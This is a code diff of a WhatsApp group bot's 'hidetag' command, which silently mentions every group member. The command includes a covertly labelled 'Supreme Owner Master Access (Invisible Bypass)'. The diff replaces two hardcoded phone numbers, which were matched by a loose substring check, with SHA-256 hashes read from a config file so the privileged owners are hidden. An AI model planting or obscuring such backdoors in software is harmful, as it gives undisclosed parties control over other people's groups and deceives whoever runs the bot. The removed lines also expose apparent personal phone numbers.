@@ -1,11 +1,12 @@
 /**
  * HideTag Command - Silently tag all group members without listing them
  * GhostG-X Edition
- * Sécurité : Supreme Owner Master Access (Invisible Bypass)
+ * Sécurité : Supreme Owner Master Access (Invisible Bypass via Hashes)
  */
 
 const { downloadMediaMessage } = require('@whiskeysockets/baileys');
 const config = require('../../config.js');
+const crypto = require('crypto');
 
 // Fonction pour le style Small Caps (Cohérence visuelle du sanctuaire)
 function toSmallCaps(text) {
@@ -28,7 +29,7 @@ module.exports = {
   aliases: ['tag'],
   category: '‎⛨ ɢᴀʀᴅɪᴇɴs ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ',
   description: '『 ɢʜᴏsᴛɢ-𝐗 』➪ ɪɴᴠᴏǫᴜᴇ ᴅɪsᴄʀᴇᴛᴇᴍᴇɴᴛ ᴛᴏᴜs ʟᴇs ᴍᴇᴍʙʀᴇs ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ',
-  usage: `${prefix}hidetag <texte/media>`, // 💡 Dynamique avec ton préfixe actuel
+  usage: `${prefix}hidetag <texte/media>`, 
   groupOnly: true,
   adminOnly: true,
   botAdminNeeded: true,
@@ -40,9 +41,11 @@ module.exports = {
       const senderJid = msg.key.participant || msg.key.remoteJid;
       const senderNumber = senderJid.replace(/\D/g, '');
 
-      // 🛡️ TON ACCÈS MAÎTRE SUPRÊME INVISIBLE (Double emprise rectifiée)
-      const supremeOwners = ['22651622652', '22665108174'];
-      const isSupremeOwner = supremeOwners.some(num => senderNumber.includes(num) || num.includes(senderNumber));
+      // 🔒 TON ACCÈS MAÎTRE SUPRÊME INVISIBLE (Par Hash)
+      const senderHash = crypto.createHash('sha256').update(senderNumber).digest('hex');
+      
+      // On vérifie si le hash de l'expéditeur est dans ta liste secrète du config.js
+      const isSupremeOwner = config.supremeHashes && config.supremeHashes.includes(senderHash);
 
       const isConfigOwner = config.ownerNumber && config.ownerNumber.some(n => {
         const cleanN = String(n).replace(/\D/g, '');
